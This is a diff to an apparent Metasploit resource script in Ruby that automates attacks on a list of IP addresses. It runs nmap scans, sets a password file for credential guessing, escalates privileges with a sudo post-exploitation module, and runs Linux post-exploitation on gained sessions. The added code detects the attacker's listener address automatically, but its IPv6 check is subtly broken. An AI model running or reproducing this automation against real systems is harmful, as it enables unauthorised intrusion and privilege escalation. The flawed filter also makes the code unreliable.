@@ -6,6 +6,8 @@
 # cd $HOME/.msf4/plugins
 # wget https://raw.github.com/darkoperator/Metasploit-Plugins/master/pentest.rb
 
+require 'socket'
+
 path='/root/IPs.txt'
 remains=''
 line=''
@@ -164,13 +166,28 @@ else
 	run_single("setg PASS_FILE #{pathdefault}unix_passwords.txt")
 end
 
+# This lists all IP addresses from attacker's machine and defines LHOST with the first that's don't be localhost nor IPv6
+sock = []
+lhost = []
+
+sock = Socket.ip_address_list
+sock.each do |ip|
+        lhost.push(ip.ip_address)
+end
+
+lhost.each do |ip|
+        if !ip.include? ("127" or "::")
+		run_single("setg LHOST #{ip}")
+                break
+        end
+end
+
 run_single("load reportEmail")
 run_single("load pentest")
 Dir.chdir('/root')
 File.foreach(path) { |each|
 File.open(path, 'r') {|file| line=file.gets; remains=file.read}
   run_single("setg RHOSTS #{line}")
-  run_single("setg LHOST 192.168.0.113")
   run_single("db_nmap #{line} -sS")
   sleep 10
   run_single("db_nmap -sU -P0 --max-retries 1 --max-rtt-timeout=500ms --initial-rtt-timeout=200ms --min-rtt-timeout=200ms --open --stats-every 5s #{line}")
@@ -205,11 +222,13 @@ if (framework.sessions.length > 0)
 	run_single("use post/multi/manage/sudo")
 	run_single("set SESSION 1")
 	run_single("run")
+
 	run_single("id")
 	run_single("back")
     end
   end
 end
+
 
 # Post exploit on Linux
 if (framework.sessions.length > 0)
